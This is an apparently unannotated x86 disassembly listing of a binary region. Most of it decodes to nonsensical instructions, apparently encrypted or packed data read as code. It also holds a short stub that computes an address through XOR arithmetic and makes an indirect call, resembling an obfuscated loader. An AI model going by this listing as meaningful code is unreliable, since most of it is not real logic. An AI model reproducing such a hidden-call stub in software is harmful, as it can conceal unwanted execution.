  40da84:	jb     0x40dad5
  40da86:	daa    
  40da87:	adc    BYTE PTR ds:0x3dfbafa4,bh
  40da8d:	div    dh
  40da8f:	jae    0x40da93
  40da91:	dec    DWORD PTR [esi+0x78f50fb7]
  40da97:	add    eax,0x60e4bfdc
  40da9c:	js     0x40db16
  40da9e:	(bad)  
  40da9f:	out    dx,al
  40daa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daa1:	(bad)  
  40daa2:	xchg   esi,eax
  40daa3:	jno    0x40da49
  40daa5:	jne    0x40db1a
  40daa7:	shl    BYTE PTR [esi],0x90
  40daaa:	inc    ecx
  40daab:	sbb    ecx,DWORD PTR [edx-0x3c4f41f2]
  40dab1:	push   es
  40dab2:	dec    edx
  40dab3:	or     DWORD PTR [edi+0x17],ebp
  40dab6:	lock xchg edx,eax
  40dab8:	dec    esi
  40dab9:	dec    eax
  40daba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dabb:	sub    cl,BYTE PTR [ecx+0x7]
  40dabe:	(bad)  
  40dabf:	ja     0x40da67
  40dac1:	lock mov eax,0xa2b9e6dc
  40dac7:	scas   al,BYTE PTR es:[edi]
  40dac8:	nop    DWORD PTR [edi-0x10f7771]
  40dacf:	jg     0x40db19
  40dad1:	mov    ch,0x5c
  40dad3:	fld    QWORD PTR [esi-0x7b8bbca1]
  40dad9:	lea    ecx,[ebp-0x7b23dfc5]
  40dadf:	pop    ebx
  40dae0:	ins    BYTE PTR es:[edi],dx
  40dae1:	sub    eax,0xf968128d
  40dae6:	sahf   
  40dae7:	sub    dh,BYTE PTR ds:0xcebe4122
  40daed:	loope  0x40dad7
  40daef:	imul   bh
  40daf1:	lods   al,BYTE PTR ds:[esi]
  40daf2:	or     eax,0x813564c6
  40daf7:	sbb    al,0xc8
  40daf9:	push   es
  40dafa:	sub    BYTE PTR [edi+0x4eb2983d],dh
  40db00:	push   esi
  40db01:	popf   
  40db02:	mov    al,ds:0x35814b6f
  40db07:	shl    DWORD PTR [ebx],1
  40db09:	imul   edi,edx,0xbbc839ee
  40db0f:	(bad)  
  40db10:	sti    
  40db11:	xor    ecx,0x2ff4de30
  40db17:	xchg   ebx,eax
  40db18:	cwde   
  40db19:	and    al,0xf6
  40db1b:	cmp    ecx,DWORD PTR [eax+0x18aabddf]
  40db21:	iret   
  40db22:	aaa    
  40db23:	ins    BYTE PTR es:[edi],dx
  40db24:	mov    ds:0x10c8bb7d,al
  40db29:	cld    
  40db2a:	dec    edx
  40db2b:	fiadd  DWORD PTR [eax]
  40db2d:	mov    esp,0x4d66f859
  40db32:	jns    0x40db9f
  40db34:	or     BYTE PTR [ebx-0x1b],ch
  40db37:	ja     0x40db57
  40db39:	jl     0x40dacf
  40db3b:	mov    eax,ds:0x77a1bff2
  40db40:	jne    0x40db6f
  40db42:	xor    eax,0xbf5b3bfa
  40db47:	push   ecx
  40db48:	jns    0x40db98
  40db4a:	loope  0x40db07
  40db4c:	xchg   ebx,eax
  40db4d:	icebp  
  40db4e:	jns    0x40db35
  40db50:	jae    0x40daf9
  40db52:	jp     0x40daf8
  40db54:	pop    ebx
  40db55:	or     al,0xa2
  40db57:	psubsb mm2,QWORD PTR [ebp+0x2e5f46c8]
  40db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db5f:	mov    edi,0xb3ef89c3
  40db64:	pop    esp
  40db65:	js     0x40db55
  40db67:	mov    ch,0x68
  40db69:	(bad)  
  40db6a:	mov    ds:0xb2e0584a,al
  40db6f:	jg     0x40db45
  40db71:	sbb    al,0x0
  40db73:	je     0x40dbaa
  40db75:	fcomp  QWORD PTR [esi+0x1992bfeb]
  40db7b:	es xchg esi,eax
  40db7d:	fild   DWORD PTR [esi]
  40db7f:	test   eax,0x3d746f2e
  40db84:	xor    al,0x12
  40db86:	pop    esi
  40db87:	aad    0xb8
  40db89:	mov    esp,0x17a2d8c2
  40db8e:	dec    ebx
  40db8f:	xchg   esi,eax
  40db90:	out    dx,al
  40db91:	jb     0x40db40
  40db93:	jmp    0x40dc0c
  40db95:	dec    esp
  40db96:	loopne 0x40dbbe
  40db98:	inc    esi
  40db99:	xchg   ebp,eax
  40db9a:	jne    0x40db22
  40db9c:	sbb    DWORD PTR [edx+0x4447e3d7],esi
  40dba2:	imul   edi,DWORD PTR [edi],0x14
  40dba5:	push   ebx
  40dba6:	mov    al,0xb3
  40dba8:	into   
  40dba9:	call   0x1538eda7
  40dbae:	es and eax,0x45c91563
  40dbb4:	jp     0x40dc28
  40dbb6:	rcr    esp,0xc1
  40dbb9:	sahf   
  40dbba:	call   0xd26dddff
  40dbbf:	into   
  40dbc0:	xlat   BYTE PTR ds:[ebx]
  40dbc1:	or     DWORD PTR [ecx+0x2799b115],0xffffff9c
  40dbc8:	out    dx,al
  40dbc9:	shl    DWORD PTR [edi+0x73],1
  40dbcc:	add    al,0x9b
  40dbce:	int3   
  40dbcf:	imul   ebx,DWORD PTR [ebx+0x52],0x4e370804
  40dbd6:	and    DWORD PTR ds:0xaa24f76c,ecx
  40dbdc:	jb     0x40dbc1
  40dbde:	sub    BYTE PTR [eax+0x622d0421],dl
  40dbe4:	sbb    edx,DWORD PTR [ebx+0xfe72bf1]
  40dbea:	clc    
  40dbeb:	outs   dx,BYTE PTR ds:[esi]
  40dbec:	and    al,0x38
  40dbee:	jmp    0xda3aa88b
  40dbf3:	pop    ss
  40dbf4:	dec    ebx
  40dbf5:	pop    ebx
  40dbf6:	pushf  
  40dbf7:	dec    edi
  40dbf8:	test   eax,0xdba56e62
  40dbfd:	ins    DWORD PTR es:[edi],dx
  40dbfe:	stos   DWORD PTR es:[edi],eax
  40dbff:	out    0x1d,al
  40dc01:	pop    esp
  40dc02:	cwde   
  40dc03:	xlat   BYTE PTR ds:[ebx]
  40dc04:	idiv   dh
  40dc06:	ins    BYTE PTR es:[edi],dx
  40dc07:	iret   
  40dc08:	aad    0xab
  40dc0a:	das    
  40dc0b:	adc    ah,BYTE PTR [ebp+0x4294e2b5]
  40dc11:	cld    
  40dc12:	call   0x8ffc:0xd99bb092
  40dc19:	pop    ds
  40dc1a:	mov    ebp,0x992ff853
  40dc1f:	sub    ecx,DWORD PTR [ebx-0x25]
  40dc22:	jmp    0x40dbff
  40dc24:	mov    al,ds:0xea646b63
  40dc29:	fs adc ch,BYTE PTR ds:[esi+0x7d18a994]
  40dc31:	mov    edi,ebp
  40dc33:	outs   dx,DWORD PTR ds:[esi]
  40dc34:	call   0x17f3:0x98204295
  40dc3b:	mov    bh,0x0
  40dc3d:	scas   al,BYTE PTR es:[edi]
  40dc3e:	popf   
  40dc3f:	pop    es
  40dc40:	dec    edi
  40dc41:	popa   
  40dc42:	add    ebp,DWORD PTR [edx+edx*8-0x7771d78]
  40dc49:	rcr    ah,1
  40dc4b:	xchg   ebx,eax
  40dc4c:	jmp    0xaf41c037
  40dc51:	mov    edi,0x71201f42
  40dc56:	hlt    
  40dc57:	jge    0x40dbf3
  40dc59:	aam    0xcf
  40dc5b:	cvtps2pi mm7,QWORD PTR [edi-0x44]
  40dc5f:	and    eax,0x55d3f0f1
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x7b2c3768]
  40dc7d:	pop    esp
  40dc7e:	jge    0x40dcb5
  40dc80:	call   0x7e7e:0x7d7d7e7e
  40dc87:	fisubr WORD PTR [edx]
  40dc89:	adc    DWORD PTR [edi],esi
  40dc8b:	cmp    BYTE PTR ds:0x2b84f48e,dh
  40dc91:	cmp    bh,dl
  40dc93:	or     BYTE PTR [ecx],0x59
  40dc96:	sbb    ebx,DWORD PTR [edi]
  40dc98:	ins    BYTE PTR es:[edi],dx
  40dc99:	fwait
  40dc9a:	jl     0x40dcc2
  40dc9c:	xlat   BYTE PTR ds:[ebx]
  40dc9d:	dec    esp
  40dc9e:	cmp    eax,0x5cf19958
  40dca3:	adc    al,0xe7
  40dca5:	std    
  40dca6:	mov    dl,BYTE PTR [edx+0x78516931]
  40dcac:	or     eax,0x99b37e6e
  40dcb1:	sub    al,0x4b
  40dcb3:	bound  edx,QWORD PTR [edx+eiz*8+0x5d]
  40dcb7:	pop    ss
  40dcb8:	push   edi
  40dcb9:	adc    al,0xa4
  40dcbb:	pop    es
  40dcbc:	inc    ecx
  40dcbd:	push   ebp
  40dcbe:	les    edx,FWORD PTR [eax-0x4e86f3c6]
  40dcc4:	cmp    BYTE PTR ds:0xe8294ffc,cl
  40dcca:	mov    ch,0xa2
  40dccc:	cmp    cl,ah
  40dcce:	pusha  
  40dccf:	push   edx
  40dcd0:	pushf  
  40dcd1:	jmp    0x7aa0:0x65d81943
  40dcd8:	ins    DWORD PTR es:[edi],dx
  40dcd9:	jl     0x40dd37
  40dcdb:	cld    
  40dcdc:	jmp    0x40dc8a
  40dcde:	mov    bh,0x56
  40dce0:	in     al,dx
  40dce1:	es mov ebp,0x6b2e0d40
  40dce7:	aaa    
  40dce8:	icebp  
  40dce9:	or     eax,0x8287e709
  40dcee:	cmp    al,0xe1
  40dcf0:	scas   eax,DWORD PTR es:[edi]
  40dcf1:	in     eax,0x86
  40dcf3:	push   cs
  40dcf4:	cmp    esp,DWORD PTR [edx+0x415015c]
  40dcfa:	push   ebx
  40dcfb:	pop    esp
  40dcfc:	and    dh,BYTE PTR [edi+0x8568336]
  40dd02:	pop    esp
  40dd03:	jbe    0x40dd3a
  40dd05:	call   0xa4cccbdc
  40dd0a:	shl    DWORD PTR [edx-0x4235deef],cl
  40dd10:	xor    al,0x47
  40dd12:	jae    0x40dd18
  40dd14:	fs mov esi,0xf4eac16f
  40dd1a:	add    DWORD PTR [edi-0x17875cac],edx
  40dd20:	bnd jno 0x40dcc4
  40dd23:	dec    ebx
  40dd24:	pusha  
  40dd25:	push   0x7
  40dd27:	cdq    
  40dd28:	sbb    BYTE PTR [edi+0x4c776163],dh
  40dd2e:	mov    al,0x66
  40dd30:	or     eax,0x668f58a6
  40dd35:	sbb    ebx,edi
  40dd37:	call   0xcef382b8
  40dd3c:	rcr    DWORD PTR [ecx-0x6b8fbe0f],cl
  40dd42:	sahf   
  40dd43:	sbb    al,0xd1
  40dd45:	gs je  0x40ddba
  40dd48:	cmp    BYTE PTR ds:0xfa1cf661,ah
  40dd4e:	sbb    ah,BYTE PTR [esi+0x7b]
  40dd51:	loope  0x40dd94
  40dd53:	adc    al,bl
  40dd55:	lods   al,BYTE PTR ds:[esi]
  40dd56:	mov    al,0x23
  40dd58:	push   ecx
  40dd59:	les    ebx,FWORD PTR [esp+ebx*4+0x5e2a17f]
  40dd60:	cld    
  40dd61:	rcr    BYTE PTR gs:[esi],0x54
  40dd65:	les    eax,FWORD PTR [edi+esi*4-0xa]
  40dd69:	push   esp
  40dd6a:	js     0x40ddaa
  40dd6c:	add    BYTE PTR [ecx],dh
  40dd6e:	into   
  40dd6f:	push   esp
  40dd70:	lock xor BYTE PTR [edi],bl
  40dd73:	adc    al,0x3b
  40dd75:	xchg   edi,eax
  40dd76:	div    DWORD PTR [esi]
  40dd78:	mov    ebp,0xaa468878
  40dd7d:	jmp    0x3872258
  40dd82:	lock data16 loopne 0x40dd5e
  40dd86:	cmp    DWORD PTR [ecx+0x76],ebx
  40dd89:	jns    0x40dd7d
  40dd8b:	add    al,0x52
  40dd8d:	outs   dx,BYTE PTR ds:[esi]
  40dd8e:	ret    
  40dd8f:	sub    al,0x74
  40dd91:	das    
  40dd92:	cli    
  40dd93:	sbb    BYTE PTR [esi+ecx*8+0x6b725dff],al
  40dd9a:	xor    eax,0xae586754
  40dd9f:	sub    ebx,DWORD PTR ds:0x701f4e59
  40dda5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dda6:	sti    
  40dda7:	mov    eax,0x4d6c7c8e
  40ddac:	lea    esp,[eax-0x54e61bc0]
  40ddb2:	jns    0x40ddcf
  40ddb4:	cdq    
  40ddb5:	jmp    0xefed:0x9a800d49
  40ddbc:	add    al,0x86
  40ddbe:	mov    esp,0x20f5f722
  40ddc3:	push   ecx
  40ddc4:	xor    al,0x30
  40ddc6:	push   ebx
  40ddc7:	es sub bl,cl
  40ddca:	and    BYTE PTR [esi],cl
  40ddcc:	xor    DWORD PTR [edx+0x4b5d5ed6],0x2583d321
  40ddd6:	pop    ecx
  40ddd7:	and    eax,0xff7d04e5
  40dddc:	jns    0x40dd99
  40ddde:	mov    edi,ebp
  40dde0:	pushf  
  40dde1:	pop    ebp
  40dde2:	in     al,0x91
  40dde4:	test   eax,0xf0da92c0
  40dde9:	sbb    DWORD PTR [edi-0x6d],edx
  40ddec:	cmc    
  40dded:	xor    al,0x3b
  40ddef:	(bad)  
  40ddf0:	pop    edi
  40ddf1:	mov    ds:0xa771bd21,al
  40ddf6:	jecxz  0x40ddfd
  40ddf8:	mov    esp,0x293a3ee
  40ddfd:	mov    DWORD PTR [ecx],ebx
  40ddff:	or     BYTE PTR [esp+esi*2+0x3d93d8f5],0x34
  40de07:	(bad)  
  40de08:	cld    
  40de09:	jae    0x40ddcf
  40de0b:	xchg   DWORD PTR ds:0xa3a0c2a2,ebx
  40de11:	mov    esp,DWORD PTR [eax]
  40de13:	dec    esi
  40de14:	in     eax,dx
  40de15:	mov    esp,0xc6195fc
  40de1a:	das    
  40de1b:	xchg   ebx,eax
  40de1c:	fcmovnbe st,st(2)
  40de1e:	outs   dx,DWORD PTR ds:[esi]
  40de1f:	imul   ebx,DWORD PTR ds:0x427c22c3,0x5b5bc653
  40de29:	push   ds
  40de2a:	addr16 or eax,0xc3ee0a57
  40de30:	daa    
  40de31:	hlt    
  40de32:	cmp    al,0x18
  40de34:	mov    ss:0xc8d70ccd,eax
  40de3a:	sub    al,0xe3
  40de3c:	not    BYTE PTR [eax-0x36]
  40de3f:	xchg   BYTE PTR [eax-0x5b2565ef],bl
  40de45:	(bad)  
  40de46:	fcmovb st,st(6)
  40de48:	xor    al,BYTE PTR [bx+di-0x6a]
  40de4c:	bound  esp,QWORD PTR [ecx+0x1a]
  40de4f:	inc    esp
  40de50:	ficom  WORD PTR [ebp+ebp*2+0x41]
  40de54:	ins    BYTE PTR es:[edi],dx
  40de55:	jno    0x40de03
  40de57:	push   cs
  40de58:	daa    
  40de59:	outs   dx,DWORD PTR ds:[esi]
  40de5a:	sub    cl,BYTE PTR [eax-0x67]
  40de5d:	cwde   
  40de5e:	adc    al,BYTE PTR [ecx-0x2af7e001]
  40de64:	jle    0x40deab
  40de66:	jbe    0x40dec1
  40de68:	call   0x4c9d:0xf7084f2c
  40de6f:	pop    edi
  40de70:	in     al,0x49
  40de72:	jns    0x40de05
  40de74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de75:	sub    al,BYTE PTR [eax-0x7c]
  40de78:	sbb    edi,DWORD PTR [edi]
  40de7a:	pop    edx
  40de7b:	aam    0xce
  40de7d:	and    BYTE PTR [edi],ch
  40de7f:	push   ds
  40de80:	fcmovne st,st(6)
  40de82:	popa   
  40de83:	mov    edi,ebp
  40de85:	xchg   esi,eax
  40de86:	mov    cl,BYTE PTR [esp+esi*4]
  40de89:	push   ecx
  40de8a:	out    dx,eax
  40de8b:	sub    al,0x1c
  40de8d:	push   cs
  40de8e:	cmp    BYTE PTR [edx],cl
  40de90:	add    al,0x32
  40de92:	cmc    
  40de93:	not    ecx
  40de95:	jb     0x40df0f
  40de97:	dec    esp
  40de98:	cmp    BYTE PTR [edi],bh
  40de9a:	outs   dx,DWORD PTR ds:[esi]
  40de9b:	jae    0x40de8c
  40de9d:	dec    edi
  40de9e:	shl    BYTE PTR [edi],0x2
  40dea1:	jp     0x40df18
  40dea3:	mov    edi,0xbedd53fb
  40dea8:	sbb    ebp,edi
  40deaa:	cmp    eax,0x47a92fd2
  40deaf:	es mov ecx,0x94e1a5a4
  40deb5:	jbe    0x40df2f
  40deb7:	xchg   DWORD PTR [esi+edx*8+0x5c],ebx
  40debb:	(bad)  
  40debc:	sub    DWORD PTR [ecx+esi*4+0x4b2d442d],esi
  40dec3:	pushf  
  40dec4:	add    eax,0x5fafb4a7
  40dec9:	cdq    
  40deca:	xlat   BYTE PTR ds:[ebx]
  40decb:	sti    
  40decc:	lds    esp,FWORD PTR [ebp+0x117975da]
  40ded2:	ret    
  40ded3:	jno    0x40df33
  40ded5:	stos   DWORD PTR es:[edi],eax
  40ded6:	cdq    
  40ded7:	adc    DWORD PTR [edx],ebp
  40ded9:	std    
  40deda:	in     eax,dx
  40dedb:	sub    ebp,edx
  40dedd:	shl    dh,cl
  40dedf:	adc    al,0xad
  40dee1:	out    dx,eax
  40dee2:	add    edx,esi
  40dee4:	push   ds
  40dee5:	mov    ch,BYTE PTR [eax-0x7c2d9f85]
  40deeb:	inc    edx
  40deec:	div    esi
  40deee:	and    al,BYTE PTR [ebp+0x54bce5f]
  40def4:	scas   eax,DWORD PTR es:[edi]
  40def5:	lahf   
  40def6:	(bad)
  40def9:	cld    
  40defa:	pop    ds
  40defb:	or     ebx,DWORD PTR [ebp-0x23]
  40defe:	shl    bl,0x4e
  40df01:	ins    BYTE PTR es:[edi],dx
  40df02:	mov    cl,0x74
  40df04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df05:	sti    
  40df06:	(bad)
  40df09:	pop    edx
  40df0a:	inc    ebx
  40df0b:	dec    esp
  40df0c:	sub    al,0x1f
  40df0e:	mov    esi,0x55a9ec9b
  40df13:	inc    ecx
  40df14:	adc    ebp,eax
  40df16:	outs   dx,DWORD PTR ds:[esi]
  40df17:	or     eax,0x177e25d3
  40df1c:	stos   BYTE PTR es:[edi],al
  40df1d:	mov    esi,0xda9dd057
  40df22:	adc    al,0x24
  40df24:	xchg   cx,ax
  40df26:	cmp    bl,BYTE PTR [eax-0x18]
  40df29:	hlt    
  40df2a:	aam    0x75
  40df2c:	jns    0x40df9e
  40df2e:	xchg   edx,eax
  40df2f:	push   DWORD PTR [edx+0x54d9b4d4]
  40df35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df36:	out    dx,al
  40df37:	push   ds
  40df38:	loop   0x40df3e
  40df3a:	arpl   WORD PTR [edi-0x567322d1],si
  40df40:	ret    0x3473
  40df43:	pop    eax
  40df44:	cld    
  40df45:	mov    ecx,DWORD PTR [bx+di]
  40df48:	hlt    
  40df49:	shl    DWORD PTR [ecx+0x26f58e55],cl
  40df4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df50:	add    al,bl
  40df52:	outs   dx,BYTE PTR ds:[esi]
  40df53:	inc    edx
  40df54:	and    DWORD PTR [edi+ebp*8+0x7f],esp
  40df58:	aad    0x6f
  40df5a:	in     eax,0x11
  40df5c:	mov    edi,0x2cc06e28
  40df61:	sbb    eax,0x3db86194
  40df66:	jp     0x40df49
  40df68:	mov    ah,BYTE PTR [esi+esi*8-0xea50a14]
  40df6f:	shl    edx,0x94
  40df72:	mov    esi,0xf6eef606
  40df77:	ror    BYTE PTR [ebp+0xa],cl
  40df7a:	inc    esi
  40df7b:	cwde   
  40df7c:	je     0x40df4c
  40df7e:	scas   eax,DWORD PTR es:[edi]
  40df7f:	les    esp,FWORD PTR [ebp+0x2d8b295c]
  40df85:	adc    eax,0xb5bc77b0
  40df8a:	mov    DWORD PTR [edi+edx*4],eax
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs rcpps xmm4,xmm2
  40e026:	xlat   BYTE PTR ds:[ebx]
  40e027:	inc    esp
  40e028:	xor    BYTE PTR [ecx+0x7d7d7e7e],bl
  40e02e:	jle    0x40e0ae
  40e030:	xlat   BYTE PTR ds:[ebx]
  40e031:	cmp    al,0x1d
  40e033:	jecxz  0x40e017
  40e035:	xor    BYTE PTR [esi-0x3a],al
  40e038:	imul   cx,bx,0xfd2a
  40e03d:	aad    0xe1
  40e03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e040:	pop    ss
  40e041:	jp     0x40dfeb
  40e043:	ret    
  40e044:	rcr    al,0xc5
  40e047:	add    BYTE PTR [eax],cl
  40e049:	inc    ebp
  40e04a:	gs pop edi
  40e04c:	fcom   DWORD PTR [esi+0x1e42f8c4]
  40e052:	imul   ecx,edx,0x5a
  40e055:	in     eax,dx
  40e056:	cmp    eax,0x3792b257
  40e05b:	cmp    bh,dl
  40e05d:	mov    al,0xd4
  40e05f:	pop    ss
  40e060:	pushf  
  40e061:	jg     0x40e0af
  40e063:	loop   0x40e0a3
  40e065:	aad    0x94
  40e067:	xchg   ebx,eax
  40e068:	pop    edi
  40e069:	and    dl,BYTE PTR [ecx]
  40e06b:	cld    
  40e06c:	outs   dx,BYTE PTR ds:[esi]
  40e06d:	adc    al,bl
  40e06f:	stos   DWORD PTR es:[edi],eax
  40e070:	inc    ecx
  40e071:	jmp    0x45b3def2
  40e076:	fldcw  WORD PTR [esi]
  40e078:	lods   al,BYTE PTR ds:[esi]
  40e079:	les    esi,FWORD PTR [ebp+0x1fe0eb31]
  40e07f:	mov    BYTE PTR [edi],dl
  40e081:	pop    ecx
  40e082:	(bad)  
  40e083:	mov    ds:0x2071702a,al
  40e088:	add    edi,DWORD PTR [ebp-0x624c88f]
  40e08e:	fcom   DWORD PTR [esi]
  40e090:	loopne 0x40e015
  40e092:	cwde   
  40e093:	pusha  
  40e094:	jle    0x40e10c
  40e096:	xchg   BYTE PTR ds:0xaf1d3d23,bl
  40e09c:	iret   
  40e09d:	in     al,dx
  40e09e:	cwde   
  40e09f:	cli    
  40e0a0:	int3   
  40e0a1:	pop    edx
  40e0a2:	add    DWORD PTR [edi+0x6b3ef7b9],edi
  40e0a8:	add    BYTE PTR es:[ebp-0x40],0xe6
  40e0ad:	jnp    0x40e079
  40e0af:	arpl   di,di
  40e0b1:	and    bl,BYTE PTR [ebx-0x13d1c0d0]
  40e0b7:	aad    0xb1
  40e0b9:	jne    0x40e06b
  40e0bb:	and    eax,0xc5321a0d
  40e0c0:	in     al,dx
  40e0c1:	ja     0x40e08a
  40e0c3:	dec    esp
  40e0c4:	int3   
  40e0c5:	and    ebx,DWORD PTR [esi]
  40e0c7:	fild   QWORD PTR [ecx+edi*2+0x72]
  40e0cb:	xchg   ebp,eax
  40e0cc:	mov    edx,0xb1d9fa82
  40e0d1:	mov    bp,0x1e4c
  40e0d5:	dec    ebx
  40e0d6:	mov    edx,0xd64aafaf
  40e0db:	aas    
  40e0dc:	aad    0x7c
  40e0de:	push   eax
  40e0df:	rcl    BYTE PTR [edx+0x58],0x19
  40e0e3:	cmp    DWORD PTR [edi-0x77c32e0c],eax
  40e0e9:	sahf   
  40e0ea:	retf   
  40e0eb:	pusha  
  40e0ec:	or     BYTE PTR [edi+0xdbbf32e],0xdb
  40e0f3:	mov    ds:0x2738c377,al
  40e0f8:	mov    DWORD PTR [ebx],esp
  40e0fa:	test   al,0x85
  40e0fc:	adc    bh,dh
  40e0fe:	out    0xfa,al
  40e100:	aaa    
  40e101:	scas   eax,DWORD PTR es:[edi]
  40e102:	bound  edx,QWORD PTR [eax-0x35b32570]
  40e108:	in     eax,dx
  40e109:	bound  ebp,QWORD PTR [edx]
  40e10b:	xchg   ebx,eax
  40e10c:	adc    eax,0x9e2e8500
  40e111:	mov    edi,0xba7adcdc
  40e116:	and    ebx,DWORD PTR [edx+0x71]
  40e119:	mov    DWORD PTR [ebx-0x39],0xe44a0301
  40e120:	cli    
  40e121:	adc    edi,DWORD PTR [eax+edx*4+0x7e]
  40e125:	pop    es
  40e126:	div    BYTE PTR [ebx-0x7ccc03fc]
  40e12c:	pop    ds
  40e12d:	jbe    0x40e166
  40e12f:	retf   0xa3b4
  40e132:	fadd   st(5),st
  40e134:	sub    ah,BYTE PTR [ecx]
  40e136:	cmp    eax,0x92518da
  40e13b:	xchg   edx,eax
  40e13c:	mov    edx,0xf3efc0e6
  40e141:	stos   DWORD PTR es:[edi],eax
  40e142:	popf   
  40e143:	dec    esi
  40e144:	iret   
  40e145:	cmp    DWORD PTR [ebx],edi
  40e147:	outs   dx,BYTE PTR ds:[esi]
  40e148:	lods   eax,DWORD PTR ds:[esi]
  40e149:	das    
  40e14a:	xlat   BYTE PTR ds:[ebx]
  40e14b:	xlat   BYTE PTR ds:[ebx]
  40e14c:	add    esi,edx
  40e14e:	push   es
  40e14f:	mov    eax,ds:0x6292e0cd
  40e154:	(bad)  
  40e155:	jge    0x40e115
  40e157:	std    
  40e158:	sub    BYTE PTR [edi-0x42],0xec
  40e15c:	sub    eax,0x44c0813c
  40e161:	and    BYTE PTR [esp+ecx*1+0x52125a13],bh
  40e168:	repz sub al,0xbe
  40e16b:	jb     0x40e193
  40e16d:	xchg   ecx,eax
  40e16e:	inc    edi
  40e16f:	call   0x90d7c153
  40e174:	pop    ebp
  40e175:	sti    
  40e176:	mov    eax,ds:0x7cdebbd2
  40e17b:	outs   dx,BYTE PTR ds:[esi]
  40e17c:	nop
  40e17d:	mov    edx,0xf738555f
  40e182:	mov    ch,0xc4
  40e184:	push   ecx
  40e185:	mov    ds:0x7ba0123c,al
  40e18a:	loope  0x40e164
  40e18c:	lds    edx,FWORD PTR [edi]
  40e18e:	(bad)  
  40e18f:	push   ebp
  40e190:	push   ds
  40e191:	stos   BYTE PTR es:[edi],al
  40e192:	and    BYTE PTR [eax-0x249ed501],0x8e
  40e199:	addr16 inc ecx
  40e19b:	lock push edx
  40e19d:	jbe    0x40e16e
  40e19f:	sahf   
  40e1a0:	cmp    ah,0x7d
  40e1a3:	jno    0x40e1d9
  40e1a5:	gs xchg ebp,eax
  40e1a7:	mov    esi,0x9ca37018
  40e1ac:	push   0xffffff89
  40e1ae:	pop    ebx
  40e1af:	div    BYTE PTR [edi-0x2f4175cc]
  40e1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1b7:	aad    0xae
  40e1b9:	lea    ecx,ds:0x39440c6d
  40e1bf:	mov    ch,0xac
  40e1c1:	repz enter 0x9b01,0x48
  40e1c6:	aad    0xc5
  40e1c8:	or     DWORD PTR [ebx+eiz*1],edi
  40e1cb:	ins    BYTE PTR es:[edi],dx
  40e1cc:	sub    dl,ch
  40e1ce:	aam    0x4d
  40e1d0:	dec    ebx
  40e1d1:	in     al,dx
  40e1d2:	push   ds
  40e1d3:	call   0xbb73:0xc3c4f99e
  40e1da:	push   esp
  40e1db:	ror    cl,0x7e
  40e1de:	jb     0x40e1f4
  40e1e0:	adc    ch,BYTE PTR [eax+ebx*4-0x3ed928f2]
  40e1e7:	add    al,0xfc
  40e1e9:	arpl   WORD PTR [eax-0x18abde4e],bx
  40e1ef:	or     edi,eax
  40e1f1:	into   
  40e1f2:	fcmovb st,st(7)
  40e1f4:	mov    ch,0xbc
  40e1f6:	out    0x4b,eax
  40e1f8:	cwde   
  40e1f9:	imul   esi,DWORD PTR [esi-0x38],0xffffffc7
  40e1fd:	data16 jbe 0x40e1ee
  40e200:	pop    ss
  40e201:	repz mov cl,0x39
  40e204:	or     edi,DWORD PTR [ebx+0x4]
  40e207:	retf   0x28a4
  40e20a:	shl    eax,cl
  40e20c:	adc    esp,eax
  40e20e:	inc    ecx
  40e20f:	adc    al,0xe7
  40e211:	sub    bh,cl
